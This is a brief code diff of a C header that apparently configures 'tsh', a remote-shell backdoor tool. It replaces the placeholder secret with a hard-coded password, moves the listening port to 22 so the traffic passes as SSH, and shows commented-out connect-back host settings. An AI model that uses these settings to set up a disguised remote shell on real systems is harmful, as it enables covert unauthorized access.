@@ -1,9 +1,10 @@
 #ifndef _TSH_H
 #define _TSH_H
 
-char *secret = "replace with your password";
+char *secret = "never say never say die";
 
-#define SERVER_PORT 7586
+#define SERVER_PORT 22
+short int server_port = SERVER_PORT;
 /*
 #define CONNECT_BACK_HOST  "localhost"
 #define CONNECT_BACK_DELAY 30
